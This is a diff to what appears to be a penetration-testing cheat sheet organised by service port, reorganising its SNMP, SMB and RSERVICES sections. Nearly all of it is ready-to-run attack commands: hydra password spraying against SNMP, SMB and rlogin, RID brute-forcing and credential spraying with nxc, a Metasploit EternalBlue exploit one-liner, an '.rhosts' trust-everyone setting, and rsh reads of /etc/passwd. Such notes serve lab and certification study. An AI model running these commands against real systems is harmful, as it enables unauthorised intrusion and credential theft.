@@ -568,18 +568,11 @@ for host in $(cat dc-hosts); do echo "================[   $host   ]=============
 for host in $(cat dc-hosts); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'
 
 [*] (161) SNMP
-(onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
-(onesixtyone $TARGET -c /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -w 5 -o SNMPhuge.onesixtyone &)
-(hydra snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPsmall.hydra &)
-(hydra snmpv2c://$TARGET - P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t60 -I 2>/dev/null | grep '\[snmp\]' | tee SNMPhuge.hydra &)
++---------- Spray Service ----------+
+hydra -I snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t15 2>/dev/null
 
-cat *.onesixtyone
-cat *.hydra
-
-snmp-check $TARGET -c COMMUNITY -v 2c
-
-sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
-snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
++---------- Read Service ----------+
+snmp-check $TARGET -c COMMUNITY_STRING -v 2c
 
 [*] (389) LDAP
 +---------- Spray Service ----------+
@@ -620,13 +613,9 @@ godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 +---------- Spray Service ----------+
 hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
 
-+---------- Get Shares ----------+
++---------- Get Shares, Users and Groups ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-
-+---------- Get Users ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
-
-+---------- Get Groups ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --groups | grep 'membercount' | cut -d':' -f1 | sed 's/^[^ ]* *[^ ]* *[^ ]* *[^ ]* *//' | sed 's/ *membercount.*//' >> groups
 
 +---------- Spider Share for Files ----------+
@@ -652,11 +641,18 @@ download file.txt
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
++---------- Spray Service ----------+
+hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
+
++---------- Allow All Connections ----------+
 echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts
+
++---------- Login to Service ----------+
 rsh -l $USERNAME $TARGET
-rsh -l $USERNAME $TARGET cat /etc/passwd
 rlogin -l $USERNAME $TARGET
-rlogin -l $USERNAME $TARGET cat /etc/passwd
+
++---------- Execute Commands ----------+
+rsh -l $USERNAME $TARGET cat /etc/passwd
 
 [*] (1433) MSSQL
 +---------- Spray Service ----------+
